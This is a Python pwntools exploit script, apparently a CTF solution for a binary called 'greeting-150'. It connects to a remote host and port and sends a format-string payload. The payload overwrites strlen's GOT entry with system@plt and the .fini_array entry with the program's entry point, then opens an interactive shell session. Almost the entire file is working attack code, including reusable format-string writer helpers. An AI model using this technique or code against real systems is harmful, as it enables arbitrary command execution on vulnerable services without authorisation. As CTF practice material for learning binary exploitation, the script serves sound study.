#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "greeting-150"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 46553

LOCAL = 0
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

#--------------------------Exploit--------------------------
def exploit():
	ru('... ')

	strlen_got = exe.got['strlen']
	# ELF Termination Funciton Talbe
	# strlen_got 0x08049a54
	fini_array = 0x08049934
	start_addr = 0x080484F0
	system_plt = 0x08048490

	# 'Nice to meet you, %s:)' + str
	# offset 12
	offset = 12
	prelen = len('Nice to meet you, ')

	li('strlen_got: ' + hex(strlen_got))
	li('fini_array: ' + hex(0x08049934))
	
	p = 'AA' #aliament
	p += p32(strlen_got + 2)
	p += p32(fini_array + 2)

	p += p32(strlen_got)
	p += p32(fini_array)
	#modify highword(strlen_got)
	p += '%' + str(0x0804 - 0x12 - prelen) + 'c%' + str(offset) + '$hn' 
	p += '%' + str(offset + 1) + '$hn' #modify highword(fini_arry_addr) 

	#modify lowword(system_plt)
	p += '%' + str(0x8490 - 0x804) + 'c%' + str(offset + 2) + '$hn'
	#modify lowword(fini_plt)
	p += '%' + str(0x84F0 - 0x8490) + 'c%' + str(offset + 3) + '$hn'

	sl(p)

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIBC:
			libc = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
		
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
